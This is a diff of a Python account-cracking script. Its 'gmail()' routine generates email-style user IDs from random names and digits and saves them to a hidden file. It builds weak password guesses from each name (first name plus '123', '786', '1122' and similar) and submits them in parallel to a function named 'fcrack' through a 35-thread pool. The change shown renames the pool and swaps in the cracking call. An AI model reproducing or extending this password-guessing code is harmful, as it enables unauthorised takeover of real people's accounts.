@@ -402,7 +402,7 @@ def gmail():
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as Aking:
+                with ThreadPool(max_workers=35) as yaari:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -418,7 +418,7 @@ def gmail():
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                                Aking.submit(rndm,ids,passlist)
+                                yaari.submit(fcrack,uid,pwx,tl)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
